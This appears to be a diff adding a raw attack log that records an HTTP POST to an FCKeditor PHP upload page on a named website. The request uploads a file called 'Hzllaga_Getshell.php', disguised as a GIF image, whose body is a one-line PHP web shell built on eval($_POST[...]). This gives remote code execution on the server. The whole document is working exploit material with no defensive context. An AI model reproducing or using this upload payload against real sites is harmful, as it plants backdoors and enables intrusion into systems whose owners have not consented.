@@ -1,0 +1,20 @@
+-------LOG_admin_20181129105151_ok.csv-------
+POST /fckeditor/editor/filemanager/upload/php/upload.php?Type=Media HTTP/1.1
+Connection: close
+Content-Type: multipart/form-data; boundary=---------------------------186972382420519
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Referer: http://www.gongdannet.co.kr/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
+Upgrade-Insecure-Requests: 1
+Content-Length: 240
+Host: www.gongdannet.co.kr
+
+-----------------------------186972382420519
+Content-Disposition: form-data; name="NewFile"; filename="Hzllaga_Getshell.php"
+Content-Type: image/jpeg
+
+GIF89a
+<?php eval($_POST[haihai]) ?>
+-----------------------------1
+------end--------
